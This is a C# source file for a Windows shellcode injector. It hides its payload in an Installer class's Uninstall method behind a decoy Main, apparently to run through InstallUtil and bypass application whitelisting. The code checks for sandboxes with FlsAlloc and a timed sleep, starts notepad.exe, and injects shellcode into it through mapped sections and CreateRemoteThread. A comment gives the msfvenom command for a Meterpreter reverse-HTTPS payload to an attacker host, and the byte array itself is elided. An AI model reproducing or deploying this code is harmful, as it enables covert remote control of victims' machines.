using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Configuration.Install;

namespace Shell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll")]
        public static extern uint NtClose(IntPtr handle);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            Process.Start("notepad.exe");

            Process[] expProc = Process.GetProcessesByName("notepad");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 -f csharp
            byte[] buf = new byte[671] { 0xfc, 0x48, ..., 0xff, 0xd5 };

            IntPtr s = IntPtr.Zero;
            IntPtr ba1 = IntPtr.Zero;
            IntPtr ba2 = IntPtr.Zero;

            uint vs = 0;

            ulong li = (ulong)buf.Length;

            uint SECTION_ALL_ACCESS = 0xF001F;
            uint SEC_COMMIT = 0x8000000;
            uint ViewShare = 1;
            ulong sectionOffset = 0;

            uint res = NtCreateSection(ref s, SECTION_ALL_ACCESS, IntPtr.Zero, ref li, 0x40, SEC_COMMIT, IntPtr.Zero);

            res = NtMapViewOfSection(s, GetCurrentProcess(), ref ba1, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);

            res = NtMapViewOfSection(s, hProcess, ref ba2, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);

            Marshal.Copy(buf, 0, ba1, buf.Length);

            res = NtUnmapViewOfSection(GetCurrentProcess(), ba1);

            res = NtClose(s);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ba2, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }

}